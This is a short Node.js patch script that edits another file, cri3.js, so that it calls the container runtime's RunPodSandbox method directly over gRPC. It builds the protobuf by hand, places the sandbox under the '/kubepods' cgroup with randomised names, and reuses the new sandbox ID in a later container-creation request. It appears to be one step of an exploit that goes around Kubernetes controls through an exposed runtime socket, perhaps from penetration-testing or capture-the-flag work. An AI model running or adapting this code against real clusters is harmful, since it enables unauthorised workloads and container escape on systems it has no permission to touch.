const fs=require('fs');
let c=fs.readFileSync('cri3.js','utf8');
// sandbox config with cgroup_parent
c=c.replace("call('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{","const cp=fl(0x0a,'/kubepods');\nconst lcfg=Buffer.concat([cp]);\nconst pm2=Buffer.concat([fl(0x0a,'zzsb'+Math.floor(Math.random()*1e6)),fl(0x12,'u'+Math.floor(Math.random()*1e9)),fl(0x1a,'default'),v1(0x20,1)]);\nconst pcfg2=Buffer.concat([pm2, fl(0x12,'zzsb'), fl(0x1a,'/tmp'), Buffer.concat([v1(0x42,lcfg.length),lcfg])]);\ncall('/runtime.v1.RuntimeService/ListContainers',Buffer.from([0x0a,0x00]),(e,lb)=>{");
c=c.replace("if(all.length<2)return; const cid=all[0], sb=all[1];","if(all.length<2)return; const cid=all[0], sb=all[1];\n call('/runtime.v1.RuntimeService/RunPodSandbox',pcfg2,(eR,sbR)=>{ const sm=(sbR||Buffer.alloc(0)).toString('latin1').match(/[0-9a-f]{64}/); if(sm){ sb2=sm[0] } });");
c=c.replace("const cid=all[0], sb=all[1];","const cid=all[0], sb=all[1]; let sb2=sb;");
c=c.replace("Buffer.concat([fl(0x0a,sb), v1(0x12,cfg.length), cfg])","Buffer.concat([fl(0x0a,sb2), v1(0x12,cfg.length), cfg])");
fs.writeFileSync('cri3.js',c);
console.log('patched');
